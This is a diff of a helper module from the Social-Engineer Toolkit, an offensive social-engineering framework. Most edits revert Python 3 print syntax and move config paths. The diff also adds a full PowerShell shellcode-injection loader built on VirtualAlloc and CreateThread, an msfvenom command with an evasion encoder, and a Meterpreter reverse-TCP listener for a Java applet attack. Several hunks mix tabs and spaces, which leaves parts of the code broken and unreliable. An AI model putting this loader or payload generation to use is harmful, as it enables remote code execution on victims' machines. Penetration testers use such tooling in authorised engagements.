@@ -19,16 +19,13 @@ import thread
 import cStringIO
 import trace
 
-try: raw_input
-except: raw_input = input
-
 # check to see if we have python-pycrypto
 try:
     from Crypto.Cipher import AES
 
 except ImportError:
 
-    print ("[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
+    print "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications."
     pass
 
 # get the main SET path
@@ -205,7 +202,7 @@ def debug_msg(currentModule, message, msgType):
     else:
         if msgType <= DEBUG_LEVEL:
             # a bit more streamlined
-            print(bcolors.RED + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + bcolors.ENDC)
+            print bcolors.RED + "\nDEBUG_MSG: from module '" + currentModule + "': " + message + bcolors.ENDC
 
             if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                 raw_input("waiting for <ENTER>\n")
@@ -218,29 +215,29 @@ def mod_name():
 ##########################################
 ############ RUNTIME MESSAGES ############
 def print_status(message):
-    print(bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message))
+    print bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message)
 
 def print_info(message):
-    print(bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message))
+    print bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message)
 
 def print_info_spaces(message):
-    print(bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message))
+    print bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message)
 
 def print_warning(message):
-    print(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message))
+    print bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message)
 
 def print_error(message):
-    print(bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC)
+    print bcolors.RED + bcolors.BOLD + "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC
 
 def get_version():
-    define_version = '6.3.2'
+    define_version = '6.4'
     return define_version
 
 class create_menu:
     def __init__(self, text, menu):
         self.text = text
         self.menu = menu
-        print(text)
+        print text
         for i, option in enumerate(menu):
 
             menunum = i + 1
@@ -253,7 +250,7 @@ class create_menu:
                 else:
                     print('  %s) %s' % (menunum,option))
             else:
-                print('\n  99) Return to Main Menu\n')
+                print '\n  99) Return to Main Menu\n'
         return
 
 def validate_ip(address):
@@ -283,44 +280,44 @@ def meta_path():
     trigger = 0
     if not os.path.isdir(msf_path):
 
-        # specific for kali linux
-        if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
-            msf_path = "/opt/metasploit/apps/pro/msf3/"
-            trigger = 1
+                # specific for kali linux
+                if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
+                    msf_path = "/opt/metasploit/apps/pro/msf3/"
+                    trigger = 1
 
-        # specific for backtrack5 and other backtrack versions
-            if os.path.isfile("/opt/framework3/msf3/msfconsole"):
-                msf_path = "/opt/framework3/msf3/"
-                trigger = 1
-            if os.path.isfile("/opt/framework/msf3/msfconsole"):
-                msf_path = "/opt/framework/msf3/"
-                trigger = 1
-            if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
-                msf_path = "/opt/metasploit/msf3/"
-                trigger = 1
+                # specific for backtrack5 and other backtrack versions
+                if os.path.isfile("/opt/framework3/msf3/msfconsole"):
+                    msf_path = "/opt/framework3/msf3/"
+                    trigger = 1
+                if os.path.isfile("/opt/framework/msf3/msfconsole"):
+                    msf_path = "/opt/framework/msf3/"
+                    trigger = 1
+                if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
+                    msf_path = "/opt/metasploit/msf3/"
+                    trigger = 1
 
                 # specific for pwnpad and pwnplug (pwnie express)
-            if os.path.isfile("/opt/metasploit-framework/msfconsole"):
-                msf_path = "/opt/metasploit-framework/"
-                trigger = 1
+                if os.path.isfile("/opt/metasploit-framework/msfconsole"):
+                    msf_path = "/opt/metasploit-framework/"
+                    trigger = 1
 
-        if os.path.isfile("/usr/bin/msfconsole"):
-            msf_path = ""
-            trigger = 1
+		if os.path.isfile("/usr/bin/msfconsole"):
+			msf_path = ""
+			trigger = 1
 
-            if trigger == 0:
-                if check_os() != "windows":
-                    check_metasploit = check_config("METASPLOIT_MODE=").lower()
-                    if check_metasploit != "off":
-                        print_error("Metasploit path not found. These payloads will be disabled.")
-                        print_error("Please configure in the config/set_config.")
-                        return_continue()
-                        return False
+                if trigger == 0:
+                    if check_os() != "windows":
+                        check_metasploit = check_config("METASPLOIT_MODE=").lower()
+                        if check_metasploit != "off":
+                            print_error("Metasploit path not found. These payloads will be disabled.")
+                            print_error("Please configure in the /etc/setoolkit/set.config.")
+                            return_continue()
+                            return False
 
-                # if we are using windows
-                if check_os() == "windows":
-                    print_warning("Metasploit payloads are not currently supported. This is coming soon.")
-                    msf_path = ""
+                    # if we are using windows
+                    if check_os() == "windows":
+                        print_warning("Metasploit payloads are not currently supported. This is coming soon.")
+                        msf_path = ""
 
     # this is an option if we don't want to use Metasploit period
     check_metasploit = check_config("METASPLOIT_MODE=").lower()
@@ -332,7 +329,7 @@ def meta_path():
 #
 def meta_database():
     # DEFINE METASPLOIT PATH
-    meta_path = file("%s/config/set_config" % (definepath()),"r").readlines()
+    meta_path = file("/etc/setoolkit/set.config", "r").readlines()
     for line in meta_path:
         line = line.rstrip()
         match = re.search("METASPLOIT_DATABASE=", line)
@@ -347,7 +344,7 @@ def meta_database():
 #
 def grab_ipaddress():
     try:
-        fileopen = file("%s/config/set_config" % (definepath()), "r").readlines()
+        fileopen = file("/etc/setoolkit/set.config", "r").readlines()
         for line in fileopen:
             line = line.rstrip()
             match = re.search("AUTO_DETECT=ON", line)
@@ -380,9 +377,9 @@ def grab_ipaddress():
                     if ip_check == True: break
                 return rhost
 
-    except Exception as e:
+    except Exception, e:
         print_error("ERROR:Something went wrong:")
-        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
+        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC
 
 
 #
@@ -439,12 +436,12 @@ def help_menu():
     fileopen = file("README.md", "r").readlines()
     for line in fileopen:
         line = line.rstrip()
-        print(line)
+        print line
     fileopen = file("readme/CREDITS", "r").readlines()
-    print("\n")
+    print "\n"
     for line in fileopen:
         line = line.rstrip()
-        print(line)
+        print line
     return_continue()
 
 
@@ -616,17 +613,17 @@ def java_applet_attack(website, port, directory):
 
     applet_name = check_options("APPLET_NAME=")
     if applet_name == "":
-        applet_name = generate_random_string(6, 15) + ".jar"
+	applet_name = generate_random_string(6, 15) + ".jar"
 
-        # lastly we need to copy over the signed applet
-        subprocess.Popen("cp %s/Signed_Update.jar %s/%s" % (setdir,directory,applet_name), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+    # lastly we need to copy over the signed applet
+    subprocess.Popen("cp %s/Signed_Update.jar %s/%s" % (setdir,directory,applet_name), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
-        # start the web server by running it in the background
-        start_web_server(directory)
+    # start the web server by running it in the background
+    start_web_server(directory)
 
-        # run multi handler for metasploit
-        print_info("Starting the multi/handler through Metasploit...")
-        metasploit_listener_start("windows/meterpreter/reverse_tcp",port)
+    # run multi handler for metasploit
+    print_info("Starting the multi/handler through Metasploit...")
+    metasploit_listener_start("windows/meterpreter/reverse_tcp",port)
 
 #
 # this will create a raw PDE file for you to use in your teensy device
@@ -718,7 +715,7 @@ def log(error):
 #
 def upx(path_to_file):
     # open the set_config
-    fileopen = file("config/set_config", "r")
+    fileopen = file("/etc/setoolkit/set.config", "r")
     for line in fileopen:
         line = line.rstrip()
         match = re.search("UPX_PATH=", line)
@@ -764,84 +761,84 @@ def show_banner(define_version,graphic):
     else:
         os.system("clear")
 
-    print (bcolors.BLUE + """
+    print bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]
 [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
-[---]                 Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
-[---]              Codename: '""" + bcolors.YELLOW + """#HugLife""" + bcolors.BLUE + """'                [---]
+[---]                  Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                    [---]
+[---]              Codename: '""" + bcolors.YELLOW + """#PLACE""" + bcolors.BLUE + """'                [---]
 [---]        Follow us on Twitter: """ + bcolors.PURPLE+ """@TrustedSec""" + bcolors.BLUE+"""         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE+ """@HackingDave""" + bcolors.BLUE+"""        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
 
 """ + bcolors.GREEN+"""        Welcome to the Social-Engineer Toolkit (SET). 
          The one stop shop for all of your SE needs.
-""")
-    print(bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC)
-    print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC)
+"""
+    print bcolors.BLUE + """     Join us on irc.freenode.net in channel #setoolkit\n""" + bcolors.ENDC
+    print bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n             Visit: """ + bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC
 
 def show_graphic():
     menu = random.randrange(2,13)
     if menu == 2:
-        print(bcolors.YELLOW + r"""
+        print bcolors.YELLOW + r"""
                  .--.  .--. .-----.
                 : .--': .--'`-. .-'
                 `. `. : `;    : :
                  _`, :: :__   : :
-                `.__.'`.__.'  :_;   """ + bcolors.ENDC)
+                `.__.'`.__.'  :_;   """ + bcolors.ENDC
         return
 
     if menu == 3:
-        print(bcolors.GREEN + r"""
+        print bcolors.GREEN + r"""
           _______________________________
          /   _____/\_   _____/\__    ___/
          \_____  \  |    __)_   |    |
          /        \ |        \  |    |
         /_______  //_______  /  |____|
-                \/         \/            """ + bcolors.ENDC)
+                \/         \/            """ + bcolors.ENDC
         return
 
     if menu == 4:
-        print(bcolors.BLUE + r"""
+        print bcolors.BLUE + r"""
             :::===  :::===== :::====
             :::     :::      :::====
              =====  ======     ===
                 === ===        ===
             ======  ========   ===
-""" + bcolors.ENDC)
+""" + bcolors.ENDC
 
     if menu == 5:
-        print(bcolors.RED + r"""
+        print bcolors.RED + r"""
            ..######..########.########
            .##....##.##..........##...
            .##.......##..........##...
            ..######..######......##...
            .......##.##..........##...
            .##....##.##..........##...
-           ..######..########....##...  """ + bcolors.ENDC)
+           ..######..########....##...  """ + bcolors.ENDC
         return
 
     if menu == 6:
-        print (bcolors.PURPLE + r'''
+        print bcolors.PURPLE + r'''
          .M"""bgd `7MM"""YMM MMP""MM""YMM
         ,MI    "Y   MM    `7 P'   MM   `7
         `MMb.       MM   d        MM
           `YMMNq.   MMmmMM        MM
         .     `MM   MM   Y  ,     MM
         Mb     dM   MM     ,M     MM
-        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC)
+        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC
         return
 
     if menu == 7:
-        print (bcolors.YELLOW + r"""
+        print bcolors.YELLOW + r"""
               ________________________
               __  ___/__  ____/__  __/
               _____ \__  __/  __  /
               ____/ /_  /___  _  /
-              /____/ /_____/  /_/     """ + bcolors.ENDC)
+              /____/ /_____/  /_/     """ + bcolors.ENDC
         return
 
     if menu == 8:
-        print (bcolors.RED + r'''
+        print bcolors.RED + r'''
           !\_________________________/!\
           !!                         !! \
           !! Social-Engineer Toolkit !!  \
@@ -859,11 +856,11 @@ def show_graphic():
          /oooo  oooo  oooo  oooo /!
         /ooooooooooooooooooooooo/ /
        /ooooooooooooooooooooooo/ /
-      /C=_____________________/_/''' + bcolors.ENDC)
+      /C=_____________________/_/''' + bcolors.ENDC
 
     
     if menu == 9:
-        print (bcolors.YELLOW + """
+        print bcolors.YELLOW + """
      01011001011011110111010100100000011100
      10011001010110000101101100011011000111
      10010010000001101000011000010111011001
@@ -884,11 +881,11 @@ def show_graphic():
      01011001010111001000100000010101000110
      11110110111101101100011010110110100101
      11010000100000001010100110100001110101
-     011001110111001100101010""" + bcolors.ENDC)
+     011001110111001100101010""" + bcolors.ENDC
 
 
     if menu == 10:
-        print (bcolors.GREEN + """
+        print bcolors.GREEN + """
                           .  ..                             
                        MMMMMNMNMMMM=                        
                    .DMM.           .MM$                     
@@ -911,10 +908,10 @@ def show_graphic():
                     ,MM?          .MMM                      
                        ,MMMMMMMMMMM 
                      
-                https://www.trustedsec.com""" + bcolors.ENDC)
+                https://www.trustedsec.com""" + bcolors.ENDC
     
     if menu == 11:
-        print (bcolors.backBlue + r"""
+        print bcolors.backBlue + r"""
                           _                                           J
                          /-\                                          J
                     _____|#|_____                                     J
@@ -935,11 +932,11 @@ def show_graphic():
                  | ||___| | |___|| |                                  !
                  |-----------------|                                  !
                  |   Timey Wimey   |                                  !
-                 -------------------                                  !""" + bcolors.ENDC)
+                 -------------------                                  !""" + bcolors.ENDC
 
 
     if menu == 12:
-        print (bcolors.RED + r"""
+	print bcolors.RED + r"""
                       ..:::::::::..
                   ..:::aad8888888baa:::..
               .::::d:?88888888888?::8b::::.
@@ -960,13 +957,13 @@ def show_graphic():
             `::::::::88::88::P::::88::::::::'
               `::::::88::88:::::::88::::::'
                  ``:::::::::::::::::::''
-                      ``:::::::::''""" + bcolors.ENDC)
+                      ``:::::::::''""" + bcolors.ENDC
 
 #
 # identify if set interactive shells are disabled
 #
 def set_check():
-    fileopen=file("config/set_config", "r")
+    fileopen=file("/etc/setoolkit/set.config", "r")
     for line in fileopen:
         match = re.search("SET_INTERACTIVE_SHELL=OFF", line)
         # if we turned it off then we return a true else return false
@@ -1002,11 +999,11 @@ def custom_template():
         filewrite.write("# Author: "+author+"\n#\n#\n#\n")
         filewrite.write('SUBJECT='+'"'+subject+'"\n\n')
         filewrite.write('BODY='+'"'+body+'"\n')
-        print ("\n")
+        print "\n"
         filewrite.close()
-    except Exception as e:
+    except Exception, e:
         print_error("ERROR:An error occured:")
-        print(bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC)
+        print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC
 
 
 # routine for checking length of a payload: variable equals max choice
@@ -1119,7 +1116,7 @@ def kill_proc(port,flag):
 
 # check the config file and return value
 def check_config(param):
-    fileopen = file("%s/config/set_config" % (definepath()), "r")
+    fileopen = file("/etc/setoolkit/set.config", "r")
     for line in fileopen:
         line=line.rstrip()
         #print line
@@ -1203,11 +1200,11 @@ def socket_listener(port):
     # set is so that when we cancel out we can reuse port
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((host, port))
-    print ("Listening on 0.0.0.0:%s" % str(port))
+    print "Listening on 0.0.0.0:%s" % str(port)
     # listen for only 1000 connection
     s.listen(1000)
     conn, addr = s.accept()
-    print('Connected by', addr)
+    print 'Connected by', addr
     data = conn.recv(1024)
     # start loop
 
@@ -1217,7 +1214,7 @@ def socket_listener(port):
         # if we specify quit then break out of loop and close socket
         if command == "quit": break
         data = conn.recv(1024)
-        print(data)
+        print data
     conn.close()
 
 # generates powershell payload
@@ -1225,7 +1222,9 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
     # generate our shellcode first
     shellcode = metasploit_shellcode(payload, ipaddr, port)
-    if not "reverse_http" in payload or not "reverse_https" in payload:
+    try:
+    
+    #if not "reverse_http" in payload or not "reverse_https" in payload:
         shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
@@ -1245,19 +1244,22 @@ def generate_powershell_alphanumeric_payload(payload,ipaddr,port, payload2):
 
         # heres our shellcode prepped and ready to go
         shellcode = newdata[:-1]
-
+    except Exception, e: print_error("Something went wrong, printing error: " + str(e))
     # powershell command here, needs to be unicoded then base64 in order to use encodedcommand - this incorporates a new process downgrade attack where if it detects 64 bit it'll use x86 powershell. This is useful so we don't have to guess if its x64 or x86 and what type of shellcode to use
-    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}""" %  (shellcode))
+    # powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$cmd = "-nop -noni -enc ";if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $x86 $cmd $e"}else{;iex "& powershell $cmd $e";}""" %  (shellcode))
+
+    powershell_command = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (shellcode))
 
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le'))
 
 # generate base shellcode
 def generate_shellcode(payload,ipaddr,port):
+
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -e x86/shikata_ga_nai -a x86 --platform windows -f c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'unsigned char buf=' : '', 'unsignedcharbuf[]=' : ''}
@@ -1331,7 +1333,7 @@ def shellcode_replace(ipaddr, port, shellcode):
 # exit routine
 def exit_set():
     cleanup_routine()
-    print("\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n")
+    print "\n\n Thank you for " + bcolors.RED+"shopping" + bcolors.ENDC+" with the Social-Engineer Toolkit.\n\n Hack the Gibson...and remember...hugs are worth more than handshakes.\n"
     sys.exit()
 
 
@@ -1441,7 +1443,7 @@ def dns():
                 udps.sendto(p.respuesta(ip), addr)
 
         except KeyboardInterrupt:
-            print ("Exiting the DNS Server..")
+            print "Exiting the DNS Server.."
             sys.exit()
             udps.close()
 
@@ -1539,7 +1541,7 @@ def validateCIDRBlock(b):
             return False
     # subnet is an appropriate value (1-32)
     if (int(subnet) < 1) or (int(subnet) > 32):
-        print("Error: subnet "+str(subnet)+" wrong size.")
+        print "Error: subnet "+str(subnet)+" wrong size."
         return False
     # passed all checks -> return True
     return True
@@ -1595,49 +1597,43 @@ def check_kali():
         # if we aren't running kali
         else: return "Non-Kali"
     else:
-        print("[!] Not running a Debian variant..")
+        print "[!] Not running a Debian variant.."
         return "Non-Kali"
 
 # checking if we have bleeding-edge enabled for updates
 def bleeding_edge():
-    bleeding = check_config("BLEEDING_EDGE=").lower()
-    if bleeding == "on":
-        # first check if we are actually using Kali
-        kali = check_kali()
-        if kali == "Kali":
-            print_status("Checking to see if bleeding-edge repos are active.")
-            # check if we have the repos enabled first
-            fileopen = file("/etc/apt/sources.list", "r")
-            kalidata = fileopen.read()
-            if "deb http://repo.kali.org/kali kali-bleeding-edge main" in kalidata:
-                print_status("Bleeding edge already active..Moving on..")
-                return True
-            else:
-                print_warning("Bleeding edge repos were not detected. Use at your own risk!")
-                enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
-                if enable == "y" or enable == "yes":
-                    print_status("Backing up sources.list to /etc/apt/sources.list.bak")
-                    if os.path.isfile("/etc/apt/sources.list.bak"): os.remove("/etc/apt/sources.list.bak")
-                    shutil.copyfile("/etc/apt/sources.list", "/etc/apt/sources.list.bak")
-                    print_status("Adding Kali bleeding edge to sources.list for updates.")
-                    # we need to add repo to kali file
-                    # we will rewrite the entire apt in case not all repos are there
-                    filewrite = file("/etc/apt/sources.list", "w")
-                    filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org/kali kali main non-free contrib\ndeb-src http://http.kali.org/kali kali main non-free contrib\n## Security updates\ndeb http://security.kali.org/kali-security kali/updates main contrib non-free\ndeb http://repo.kali.org/kali kali-bleeding-edge main")
-                    filewrite.close()
-                    print("[*] It is recommended to now run apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove and restart SET.")
-                    return True
-                else:
-                    print("[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!")
+	bleeding = check_config("BLEEDING_EDGE=").lower()
+	if bleeding == "on":
+		# first check if we are actually using Kali
+		kali = check_kali()
+		if kali == "Kali":
+        		print_status("Checking to see if bleeding-edge repos are active.")
+        		# check if we have the repos enabled first
+        		if os.path.isfile("/etc/apt/sources.list.d/bleeding.list"):
+            			print_status("Bleeding edge already active..Moving on..")
+		                return True
+			else:
+            			print_warning("Bleeding edge repos were not detected. Use at your own risk!")
+            			enable = raw_input("Do you want to enable bleeding-edge repos for fast updates [yes/no]: ")
+            			if enable == "y" or enable == "yes":
+            				print_status("Adding Kali bleeding edge to sources.list for updates.")
+                			# we need to add repo to a new sources file
+                			filewrite = file("/etc/apt/sources.list.d/bleeding.list", "w")
+                			filewrite.write("# kali repos installed by SET\ndeb http://http.kali.org kali-bleeding-edge main contrib non-free")
+                			filewrite.close()
+					print_status("It is recommended that you run apt-get update && apt-get upgrade && apt-get dist-upgrade, then apt-get -t install -t kali-bleeding-edge set framework3")
+		                	return True
+				else:
+                			print "[:(] Your loss! Bleeding edge provides updates regularly to Metasploit, SET, and others!"
 
-        else:
-            print("[*] Kali Linux was not detected, moving on...")
+		else:
+			print "[*] Kali Linux was not detected, moving on..."
 
 # here we give multiple options to specify for SET java applet
 def applet_choice():
     
     # prompt here 
-    print ("""
+    print """
 [-------------------------------------------]
 Java Applet Configuration Options Below
 [-------------------------------------------]
@@ -1648,7 +1644,7 @@ Select which option you want:
 
 1. Make my own self-signed certificate applet.
 2. Use the applet built into SET.
-3. I have my own code signing certificate or applet.\n""")
+3. I have my own code signing certificate or applet.\n"""
 
     choice1 = raw_input("Enter the number you want to use [1-3]: ")
 
